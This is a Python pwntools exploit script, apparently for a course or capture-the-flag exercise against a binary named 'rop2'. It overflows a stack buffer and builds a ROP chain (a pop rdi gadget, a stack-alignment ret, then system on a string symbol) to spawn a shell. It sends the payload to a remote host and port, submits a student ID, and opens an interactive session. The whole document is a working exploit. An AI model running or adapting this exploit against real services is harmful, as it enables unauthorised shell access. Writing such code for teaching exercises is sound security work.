from pwn import *

debug = 1

context.log_level = 'DEBUG'
context.arch = 'amd64'

LOCAL = False

if LOCAL:
    p = process("./rop2")
    binary = ELF("./rop2")
else:
    p = remote("8.154.20.109", 10101)
    binary = ELF("./rop2")

rop = ROP(binary)

# target_code_addr = binary.symbols["target_code"]
binsh_code_addr = binary.symbols["gstr"]
system_addr = binary.symbols["system"]

payload = b""
payload += b"A" * (0x50 + 8)

ret_addr = rop.find_gadget(['ret'])[0]
pop_rdi = rop.find_gadget(['pop rdi'])[0]

# 构造ROP链
rop.raw(pop_rdi)
rop.raw(binsh_code_addr)
rop.raw(ret_addr)  # 添加一个ret指令以对齐栈
# rop.row(target_code_addr)
rop.raw(system_addr)



payload += rop.chain()
payload = payload.ljust(128, b"B")  # 使用ljust填充到128字节

if debug:
    # print('!!! target_code_addr: ' + hex(target_code_addr))
    print('!!! binsh_code_addr: ' + hex(binsh_code_addr))
    print('!!! pop_rdi gadget: ' + hex(pop_rdi))
    print('!!! ret_addr: ' + hex(ret_addr))
    print('!!! system_addr: ' + hex(system_addr))
    print('!!! Payload length: ' + str(len(payload)))
    print('!!! Payload content:')
    print(hexdump(payload))

if not LOCAL:
    p.recvuntil(b'Please input your StudentID:\n')
    p.sendline(b'3220103784')

p.recvuntil(b"[*] Please input the length of data:\n")
p.sendline(b"128")
p.recvuntil(b"[*] Please input the data:\n")
p.send(payload)

p.interactive()